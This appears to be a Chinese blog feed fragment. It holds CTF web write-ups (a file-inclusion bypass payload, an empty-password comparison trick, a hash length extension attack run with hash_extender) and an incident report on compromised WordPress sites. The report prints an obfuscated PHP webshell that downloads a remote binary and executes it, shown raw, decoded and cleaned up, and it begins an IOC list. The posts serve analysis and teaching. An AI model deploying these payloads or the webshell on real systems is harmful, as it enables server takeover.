class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源代码显示是文件包含类型的，想要利用需要满足3个条件</p><ol><li><code>file</code>参数不为空</li><li><code>file</code>参数是字符串</li><li>通过<code>kind</code>类中的<code>checkFile</code>方法</li></ol><p>所以用%253f（二次URL解码后是<code>?</code>）就可以绕过了，PAYLOAD：<code>file=source.php%253f/../flag.php</code></p><p><img src="/images/1563020120782.png" alt="1563020120782"></p><p>查看源代码是</p><p><img src="/images/1563020138445.png" alt="1563020138445"></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>猜密码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">session_start();</span></span><br><span class="line"><span class="comment">$_SESSION[&#x27;pwd&#x27;]=time();</span></span><br><span class="line"><span class="comment">if (isset ($_POST[&#x27;password&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">if ($_POST[&#x27;pwd&#x27;] == $_SESSION[&#x27;pwd&#x27;])</span></span><br><span class="line"><span class="comment">die(&#x27;Flag:&#x27;.$flag);</span></span><br><span class="line"><span class="comment">else&#123;</span></span><br><span class="line"><span class="comment">print &#x27;&lt;p&gt;猜测错误.&lt;/p&gt;&#x27;;</span></span><br><span class="line"><span class="comment">$_SESSION[&#x27;pwd&#x27;]=time().time();</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;猜密码&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果<code>post</code>的<code>pwd</code>等于当前的时间的时间戳，就返回<code>flag</code>,尝试过提前预判时间，发现不可以，就只能直接入手题目了，这里用到了一个弱比较，来进行一个空比较，<code>session ID</code>是我们可控的，<code>pwd</code>也是我们可控的，唯一就是<code>session</code>我们无法控制是多少，但是可以置为空，所以直接<code>post</code>空的<code>pwd</code>过去就可以了（这是<code>fix</code>后的）</p><p><img src="/images/1563020450719.png" alt="1563020450719"></p><h2 id="Fix-it-1"><a href="#Fix-it-1" class="headerlink" title="Fix it"></a>Fix it</h2><ol><li>可参考phpmyadmin官方的修复方式</li><li><code>die(&#39;Flag:&#39;.$flag);</code>-&gt;<code>die(&#39;Flag:NOPE&#39;);</code></li></ol><h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><h2 id="Break-it-1"><a href="#Break-it-1" class="headerlink" title="Break it"></a>Break it</h2><p>打开是个卫星控制系统，要日卫星？</p><p><img src="/images/1563443581056.png" alt="1563443581056"></p><p>查看下<code>robots.txt</code></p><p><img src="/images/1563443609590.png" alt="1563443609590"></p><p>访问看看</p><p><img src="/images/1563443626224.png" alt="1563443626224"></p><p>登录时抓包，发现有段<code>hash_key</code></p><p><img src="/images/1563443679265.png" alt="1563443679265"></p><p>猜测是<code>md5</code>后的值，探测下目录</p><p><img src="/images/1563443766952.png" alt="1563443766952"></p><p>发现了<code>License.txt</code></p><p>访问后发现了部分源代码</p><p><img src="/images/1563443803943.png" alt="1563443803943"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;xxxxxx_just_a_sample_xxxxxxx&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$bisskey</span> = <span class="string">&quot;xxxxxxxxx_just_a_sample_xxxxxxx&quot;</span>; <span class="comment">// To remember Easily, 10 chars allowed.</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;hash_key:&quot;</span> . <span class="variable">$hash_key</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;MyIdentity&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$username</span>) === <span class="string">&quot;admin123&quot;</span> &amp;&amp; <span class="title function_ invoke__">urldecode</span>(<span class="variable">$password</span>) != <span class="string">&quot;admin123&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;MyIdentity&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$bisskey</span> . <span class="title function_ invoke__">urldecode</span>(<span class="variable">$username</span> .<span class="variable">$password</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Great! You win!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">&quot;&lt;!-- Y0ur f!4g 1s here &quot;</span>. <span class="variable">$flag</span> . <span class="string">&quot;--&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;I don&#x27;t konw what you say!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;I don&#x27;t konw what you say!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;hash_key&quot;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$bisskey</span> . <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;admin123&quot;</span> . <span class="string">&quot;admin123&quot;</span>)), <span class="title function_ invoke__">time</span>() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));<span class="comment">//hashkey算法</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中<code>hash_key</code>算法为<code>$bisskey（长度10的字符串）</code>与url解码后的<code>admin123admin123</code>相连接后进行<code>md5</code>加密，爆破是不可能爆破了，查阅资料后发现可以用哈希扩展攻击，构造payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~/hash_extender# ./hash_extender --data admin123admin123 --secret 10 --append ciscn --signature e7187cb49ce6d5958d279284af968254 --format md5</span><br><span class="line">Type: md5</span><br><span class="line">Secret length: 10</span><br><span class="line">New signature: c862a00ecfd776d1907b30da639431e7</span><br><span class="line">New string: 61646d696e31323361646d696e313233800000000000000000000000000000000000000000000000000000000000d000000000000000636973636e</span><br></pre></td></tr></table></figure><p>替换<code>MyIdentify</code>和<code>password</code>后即可获得<code>flag</code></p><p><img src="/images/1563445111368.png" alt="1563445111368"></p><h2 id="Fix-it-2"><a href="#Fix-it-2" class="headerlink" title="Fix it"></a>Fix it</h2><p>改掉<code>bisskey</code>的值</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5W WordPress站点被shell事件调查报告</title>
      <link href="/p/bf2f.html"/>
      <url>/p/bf2f.html</url>
      
        <content type="html"><![CDATA[<h1 id="情报来源"><a href="#情报来源" class="headerlink" title="情报来源"></a>情报来源</h1><p>该情报来源：<a href="https://www.v2ex.com/t/588483">https://www.v2ex.com/t/588483</a></p><span id="more"></span><p><img src="/images/1565014686427.png" alt="1565014686427"></p><h1 id="事件跟进"><a href="#事件跟进" class="headerlink" title="事件跟进"></a>事件跟进</h1><p>随后笔者联系到了几个.cn域名的站长，获取了相关挂马文件、安装的插件和访客日志</p><p><img src="/images/1565016259980.png" alt="某站长的插件列表"></p><p><img src="/images/1565017422416.png" alt="某站长的插件列表"></p><p>简单比对后发现插件耦合度为0，基本排除了插件漏洞的可能性</p><p>从其中一个站长获取的挂马文件（名称<code>wp************.php</code>）如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">goto</span> M0cHaak; AfBuVvu: <span class="keyword">echo</span> <span class="string">&quot;\x61\165\x78\x36\x54\150\145\x69\157\x47\x68\165\x65\121\165\x33&quot;</span>; <span class="keyword">goto</span> DzfJmKX; XxMXe8C: <span class="variable">$CZMkFQn</span> = <span class="string">&quot;\x2e\57<span class="subst">&#123;$i_9JllM&#125;</span>\x20\76\40\57\x64\x65\166\x2f\x6e\165\x6c\x6c\40\62\76\x2f\x64\x65\166\x2f\x6e\165\154\154\40\46&quot;</span>; <span class="keyword">goto</span> b11TDzU; Nd2oZhY: <span class="title function_ invoke__">exec</span>(<span class="string">&quot;\160\x6b\151\x6c\x6c\40\x2d\146\x20\55\71\x20\x73\164\x65\x61\x6c\164\150&quot;</span>); <span class="keyword">goto</span> NQ4Z7pj; ei5Z2lV: <span class="title function_ invoke__">exec</span>(<span class="string">&quot;\x70\x6b\x69\154\154\x20\x2d\x39\40\x2d\146\x20\163\164\x65\x61\154\164\150&quot;</span>); <span class="keyword">goto</span> Nd2oZhY; NQ4Z7pj: <span class="variable">$Ece5IMX</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$y8D2O23</span>)); <span class="keyword">goto</span> QZ3ISTs; K_oNc7z: <span class="variable">$i_9JllM</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="variable">$vCzdB62</span> = <span class="string">&quot;\60\x31\62\x33\64\65\x36\x37\70\x39\141\142\143\x64\x65\146\x67\150\151\x6a\153\x6c\x6d\156\157\160\161\162\163\164\165\166\x77\170\171\172\x41\x42\x43\104\x45\106\x47\x48\111\x4a\113\114\x4d\x4e\x4f\120\x51\x52\x53\124\x55\x56\127\x58\131\x5a&quot;</span>, <span class="title function_ invoke__">ceil</span>(<span class="number">6</span> / <span class="title function_ invoke__">strlen</span>(<span class="variable">$vCzdB62</span>)))), <span class="number">1</span>, <span class="number">6</span>); <span class="keyword">goto</span> Df2R9FE; YJNB5pb: <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$y8D2O23</span>)) &#123; <span class="keyword">goto</span> oN2Xre3; &#125; <span class="keyword">goto</span> A855UcY; Df2R9FE: <span class="variable">$y8D2O23</span> = <span class="variable">$_POST</span>[<span class="string">&quot;\x75\x72\154&quot;</span>]; <span class="keyword">goto</span> YJNB5pb; q0tKzX2: M9DD3TQ: <span class="keyword">goto</span> TkvKp3I; M0cHaak: <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="keyword">goto</span> oMEdveg; TkvKp3I: <span class="keyword">if</span> (!(<span class="variable">$_POST</span>[<span class="string">&quot;\143\160&quot;</span>] == <span class="string">&quot;\144\157\x77\x6e\x6c\x6f\x61\144&quot;</span>)) &#123; <span class="keyword">goto</span> GKPX8hb; &#125; <span class="keyword">goto</span> K_oNc7z; L6Aig08: <span class="keyword">echo</span> <span class="string">&quot;\157\x6b&quot;</span>; <span class="keyword">goto</span> CAEUef_; rEPw0Y1: <span class="title function_ invoke__">chmod</span>(<span class="variable">$i_9JllM</span>, <span class="number">0755</span>); <span class="keyword">goto</span> XxMXe8C; A855UcY: @<span class="title function_ invoke__">unlink</span>(<span class="variable">$i_9JllM</span>); <span class="keyword">goto</span> ei5Z2lV; DzfJmKX: <span class="keyword">die</span>; <span class="keyword">goto</span> q0tKzX2; CAEUef_: oN2Xre3: <span class="keyword">goto</span> oTXs2sI; b11TDzU: <span class="title function_ invoke__">exec</span>(<span class="variable">$CZMkFQn</span>); <span class="keyword">goto</span> L6Aig08; oMEdveg: <span class="keyword">if</span> (!(<span class="variable">$_GET</span>[<span class="string">&quot;\x63\147&quot;</span>] == <span class="string">&quot;\x63\x68\x6b&quot;</span>)) &#123; <span class="keyword">goto</span> M9DD3TQ; &#125; <span class="keyword">goto</span> AfBuVvu; QZ3ISTs: <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$i_9JllM</span>, <span class="variable">$Ece5IMX</span>); <span class="keyword">goto</span> rEPw0Y1; oTXs2sI: GKPX8hb:</span><br></pre></td></tr></table></figure><p>解码+格式化后</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">goto</span> M0cHaak; </span><br><span class="line">AfBuVvu: </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;aux6TheioGhueQu3&quot;</span>; </span><br><span class="line"><span class="keyword">goto</span> DzfJmKX; </span><br><span class="line">XxMXe8C: </span><br><span class="line"><span class="variable">$CZMkFQn</span> = <span class="string">&quot;./<span class="subst">&#123;$i_9JllM&#125;</span> &gt; /dev/null 2&gt;/dev/null &amp;&quot;</span>; </span><br><span class="line"><span class="keyword">goto</span> b11TDzU; </span><br><span class="line">Nd2oZhY: </span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;pkill -f -9 stealth&quot;</span>); </span><br><span class="line"><span class="keyword">goto</span> NQ4Z7pj; </span><br><span class="line">ei5Z2lV: </span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;pkill -9 -f stealth&quot;</span>); </span><br><span class="line"><span class="keyword">goto</span> Nd2oZhY; </span><br><span class="line">NQ4Z7pj: </span><br><span class="line"><span class="variable">$Ece5IMX</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$y8D2O23</span>)); </span><br><span class="line"><span class="keyword">goto</span> QZ3ISTs; </span><br><span class="line">K_oNc7z: </span><br><span class="line"><span class="variable">$i_9JllM</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="variable">$vCzdB62</span> = <span class="string">&quot;4789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>, <span class="title function_ invoke__">ceil</span>(<span class="number">6</span> / <span class="title function_ invoke__">strlen</span>(<span class="variable">$vCzdB62</span>)))), <span class="number">1</span>, <span class="number">6</span>); </span><br><span class="line"><span class="keyword">goto</span> Df2R9FE; </span><br><span class="line">YJNB5pb: </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$y8D2O23</span>)) &#123; <span class="keyword">goto</span> oN2Xre3; </span><br><span class="line">&#125; <span class="keyword">goto</span> A855UcY; </span><br><span class="line">Df2R9FE: </span><br><span class="line"><span class="variable">$y8D2O23</span> = <span class="variable">$_POST</span>[<span class="string">&quot;url&quot;</span>]; </span><br><span class="line"><span class="keyword">goto</span> YJNB5pb; </span><br><span class="line">q0tKzX2: </span><br><span class="line">M9DD3TQ: </span><br><span class="line"><span class="keyword">goto</span> TkvKp3I; </span><br><span class="line">M0cHaak: </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">goto</span> oMEdveg; </span><br><span class="line">TkvKp3I: </span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$_POST</span>[<span class="string">&quot;cp&quot;</span>] == <span class="string">&quot;download&quot;</span>)) &#123; </span><br><span class="line"><span class="keyword">goto</span> GKPX8hb; </span><br><span class="line">&#125; <span class="keyword">goto</span> K_oNc7z; </span><br><span class="line">L6Aig08: </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ok&quot;</span>; </span><br><span class="line"><span class="keyword">goto</span> CAEUef_; </span><br><span class="line">rEPw0Y1: </span><br><span class="line"><span class="title function_ invoke__">chmod</span>(<span class="variable">$i_9JllM</span>, <span class="number">0755</span>); </span><br><span class="line"><span class="keyword">goto</span> XxMXe8C; </span><br><span class="line">A855UcY: </span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$i_9JllM</span>); </span><br><span class="line"><span class="keyword">goto</span> ei5Z2lV; </span><br><span class="line">DzfJmKX: </span><br><span class="line"><span class="keyword">die</span>; </span><br><span class="line"><span class="keyword">goto</span> q0tKzX2; </span><br><span class="line">CAEUef_: </span><br><span class="line">oN2Xre3: </span><br><span class="line"><span class="keyword">goto</span> oTXs2sI; </span><br><span class="line">b11TDzU: </span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$CZMkFQn</span>); </span><br><span class="line"><span class="keyword">goto</span> L6Aig08; </span><br><span class="line">oMEdveg: </span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$_GET</span>[<span class="string">&quot;cg&quot;</span>] == <span class="string">&quot;chk&quot;</span>)) &#123; </span><br><span class="line"><span class="keyword">goto</span> M9DD3TQ; </span><br><span class="line">&#125; <span class="keyword">goto</span> AfBuVvu; </span><br><span class="line">QZ3ISTs: </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$i_9JllM</span>, <span class="variable">$Ece5IMX</span>); </span><br><span class="line"><span class="keyword">goto</span> rEPw0Y1; </span><br><span class="line">oTXs2sI: </span><br><span class="line">GKPX8hb:</span><br></pre></td></tr></table></figure><p>整理后</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">goto</span> Fun1; </span><br><span class="line">Fun2: </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;aux6TheioGhueQu3&quot;</span>; </span><br><span class="line"><span class="keyword">goto</span> Fun3; </span><br><span class="line">Fun4: </span><br><span class="line"><span class="variable">$Var1</span> = <span class="string">&quot;./<span class="subst">&#123;$Var4&#125;</span> &gt; /dev/null 2&gt;/dev/null &amp;&quot;</span>; </span><br><span class="line"><span class="keyword">goto</span> Fun5; </span><br><span class="line">Fun6: </span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;pkill -f -9 stealth&quot;</span>); </span><br><span class="line"><span class="keyword">goto</span> Fun7; </span><br><span class="line">Fun8: </span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;pkill -9 -f stealth&quot;</span>); </span><br><span class="line"><span class="keyword">goto</span> Fun6; </span><br><span class="line">Fun7: </span><br><span class="line"><span class="variable">$Var2</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$Var3</span>)); </span><br><span class="line"><span class="keyword">goto</span> Fun9; </span><br><span class="line">Fun10: </span><br><span class="line"><span class="variable">$Var4</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="variable">$Var5</span> = <span class="string">&quot;4789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>, <span class="title function_ invoke__">ceil</span>(<span class="number">6</span> / <span class="title function_ invoke__">strlen</span>(<span class="variable">$Var5</span>)))), <span class="number">1</span>, <span class="number">6</span>); <span class="comment">//从4789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ中随机取6位</span></span><br><span class="line"><span class="keyword">goto</span> Fun11; </span><br><span class="line">Fun12: </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$Var3</span>)) &#123; <span class="keyword">goto</span> Fun13; </span><br><span class="line">&#125; <span class="keyword">goto</span> Fun14; </span><br><span class="line">Fun11: </span><br><span class="line"><span class="variable">$Var3</span> = <span class="variable">$_POST</span>[<span class="string">&quot;url&quot;</span>]; </span><br><span class="line"><span class="keyword">goto</span> Fun12; </span><br><span class="line">Fun15: </span><br><span class="line">Fun16: </span><br><span class="line"><span class="keyword">goto</span> Fun17; </span><br><span class="line">Fun1: </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">goto</span> Fun18; </span><br><span class="line">Fun17: </span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$_POST</span>[<span class="string">&quot;cp&quot;</span>] == <span class="string">&quot;download&quot;</span>)) &#123; </span><br><span class="line"><span class="keyword">goto</span> Fun19; </span><br><span class="line">&#125; <span class="keyword">goto</span> Fun10; </span><br><span class="line">Fun20: </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ok&quot;</span>; </span><br><span class="line"><span class="keyword">goto</span> Fun21; </span><br><span class="line">Fun22: </span><br><span class="line"><span class="title function_ invoke__">chmod</span>(<span class="variable">$Var4</span>, <span class="number">0755</span>); </span><br><span class="line"><span class="keyword">goto</span> Fun4; </span><br><span class="line">Fun14: </span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$Var4</span>); </span><br><span class="line"><span class="keyword">goto</span> Fun8; </span><br><span class="line">Fun3: </span><br><span class="line"><span class="keyword">die</span>; </span><br><span class="line"><span class="keyword">goto</span> Fun15; </span><br><span class="line">Fun21: </span><br><span class="line">Fun13: </span><br><span class="line"><span class="keyword">goto</span> Fun23; </span><br><span class="line">Fun5: </span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$Var1</span>); </span><br><span class="line"><span class="keyword">goto</span> Fun20; </span><br><span class="line">Fun18: </span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$_GET</span>[<span class="string">&quot;cg&quot;</span>] == <span class="string">&quot;chk&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">goto</span> Fun16; </span><br><span class="line">&#125; <span class="keyword">goto</span> Fun2; </span><br><span class="line">Fun9: </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$Var4</span>, <span class="variable">$Var2</span>); </span><br><span class="line"><span class="keyword">goto</span> Fun22; </span><br><span class="line">Fun23: </span><br><span class="line">Fun19:</span><br></pre></td></tr></table></figure><p>其中样本经过<a href="https://github.com/pk-fr/yakpro-po%E5%A4%84%E7%90%86%EF%BC%8C%E6%B7%B7%E6%B7%86%E5%90%8E%E5%A4%A7%E9%87%8F%E4%BD%BF%E7%94%A8%E4%BA%86%60goto%60%E8%AF%AD%E5%8F%A5%EF%BC%8CPHP%E5%AE%98%E6%96%B9%E5%AF%B9%60goto%60%E8%AF%AD%E5%8F%A5%E8%A7%A3%E9%87%8A">https://github.com/pk-fr/yakpro-po处理，混淆后大量使用了`goto`语句，PHP官方对`goto`语句解释</a></p><p><img src="/images/1565014857676.png" alt="1565014857676"></p><p>有了这个基础，来看看原始文件和使用<code>yakpro-po</code>混淆后的文件</p><p>原始<code>Demo</code>文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*--------------------------</span></span><br><span class="line"><span class="comment">    simple test program !</span></span><br><span class="line"><span class="comment">---------------------------*/</span></span><br><span class="line"><span class="variable">$hello</span>      = <span class="string">&quot;hello &quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;=<span class="number">7</span>;++<span class="variable">$i</span>)        <span class="comment">// small loop!</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$hello</span>;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;that&#x27;s it!&quot;</span>.PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>混淆后的文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*   __________________________________________________</span></span><br><span class="line"><span class="comment">    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.4   |</span></span><br><span class="line"><span class="comment">    |              on 2019-08-05 18:22:28              |</span></span><br><span class="line"><span class="comment">    |    GitHub: https://github.com/pk-fr/yakpro-po    |</span></span><br><span class="line"><span class="comment">    |__________________________________________________|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">goto</span> tls4K; </span><br><span class="line">go5h2: </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Z6cLw</span>; </span><br><span class="line"><span class="keyword">goto</span> rBcTy; </span><br><span class="line">uT0G7: </span><br><span class="line">Chb8G: </span><br><span class="line"><span class="keyword">goto</span> HtPK4; </span><br><span class="line">rBcTy: </span><br><span class="line">XtlH5: </span><br><span class="line"><span class="keyword">goto</span> t2u1n; </span><br><span class="line">L_cdb: </span><br><span class="line">BMnIK: </span><br><span class="line"><span class="keyword">goto</span> X6z_F; </span><br><span class="line">tls4K: </span><br><span class="line"><span class="variable">$Z6cLw</span> = <span class="string">&quot;\150\x65\x6c\x6c\157\40&quot;</span>;  <span class="comment">//hello</span></span><br><span class="line"><span class="keyword">goto</span> BvTDb; </span><br><span class="line">qvC_1: </span><br><span class="line"><span class="keyword">goto</span> BMnIK; </span><br><span class="line"><span class="keyword">goto</span> uT0G7; </span><br><span class="line">t2u1n: </span><br><span class="line">++<span class="variable">$m3Yq8</span>; </span><br><span class="line"><span class="keyword">goto</span> qvC_1; </span><br><span class="line">X6z_F: </span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$m3Yq8</span> &lt;= <span class="number">7</span>)) &#123;  </span><br><span class="line">        <span class="keyword">goto</span> Chb8G; </span><br><span class="line">&#125; <span class="keyword">goto</span> go5h2; </span><br><span class="line">BvTDb: </span><br><span class="line"><span class="variable">$m3Yq8</span> = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">goto</span> L_cdb; </span><br><span class="line">HtPK4: </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\164\150\x61\x74\47\x73\40\x69\164\x21&quot;</span> . PHP_EOL; <span class="comment">//echo &quot;that&#x27;s it!&quot;.PHP_EOL;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该<code>Demo</code>混淆后的文件执行的流程图如下</p><p><img src="/images/1565024518593.png" alt="1565024518593"></p><p>那么被混淆的样本文件执行的流程图如下</p><p><img src="/images/%E7%BB%98%E5%9B%BE1.png"></p><p>当接收到<code>GET</code>的参数<code>cg</code>并且<code>cg</code>的值为<code>chk</code>时，如果同时有<code>POST</code>参数<code>url</code>时，可以从远端下载一个二进制文件（即使为图片）并重命名后执行，这点与日志中所反馈的情况一致</p><p><img src="/images/1565148235384.png" alt="1565148235384"></p><p>由于在日志中发现了大量的疑似爆破的痕迹</p><p><img src="/images/1565148486664.png" alt="1565148486664"></p><p><img src="/images/1565148501999.png" alt="1565148501999"></p><p><img src="/images/1565148525563.png" alt="1565148525563"></p><p>笔者随后询问了几个站长站点口令情况</p><p><img src="/images/1565148403217.png" alt="第一位站长"></p><p><img src="/images/1565148461484.png" alt="第二位站长"></p><p>以及一位朋友那边反馈的情况</p><p><img src="/images/1565148568776.png" alt="1565148568776"></p><p><img src="/images/1565148580167.png" alt="1565148580167"></p><p>大致推断出本次攻击事件使用手法为<code>爆破WP帐号密码</code>和<code>Nday</code>组合的复合攻击形式，该团伙资产众多，仅查到的<code>C2</code>不止2台，扫爆服务器更是遍布全球。</p><h1 id="附-IOC-amp-部分样本Hash"><a href="#附-IOC-amp-部分样本Hash" class="headerlink" title="附 IOC &amp; 部分样本Hash"></a>附 IOC &amp; 部分样本Hash</h1><h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><table><thead><tr><th align="center">#</th><th align="center">文件名</th><th align="center">Hash(Sha1)</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">admin.php</td><td align="center">410F10A1984F482BBAD896ECF36B02C8C635A068</td></tr><tr><td align="center">2</td><td align="center">class-wc-tracker.php</td><td align="center">6332BD9649B62ED089598F65B5790E09C547BEDA</td></tr><tr><td align="center">3</td><td align="center">qgmlxvbi.php</td><td align="center">50E6B4C9B5F7FB1CBF537EA7E4A79D5AEAEC05A9</td></tr><tr><td align="center">4</td><td align="center">single-product.php</td><td align="center">6332BD9649B62ED089598F65B5790E09C547BEDA</td></tr><tr><td align="center">5</td><td align="center">SSL.php</td><td align="center">9B139D147F70A578E45DCC9F5EB15DE349CA5FF7</td></tr><tr><td align="center">6</td><td align="center">wp-201905zgepd_oddsd.php</td><td align="center">DD0542AEF7272B8BABBFF82613738C9CA27FE6AF</td></tr><tr><td align="center">7</td><td align="center">wp-mail.php</td><td align="center">EF7F87C5F4FCB47FD69A6380D06A2B5DE276C68D</td></tr><tr><td align="center">8</td><td align="center">wp-image-edit.php</td><td align="center">2D273F89B9EC9AE356FD96142EE5DCF6A75DAB6F</td></tr></tbody></table><h2 id="IOC-【爆破】"><a href="#IOC-【爆破】" class="headerlink" title="IOC 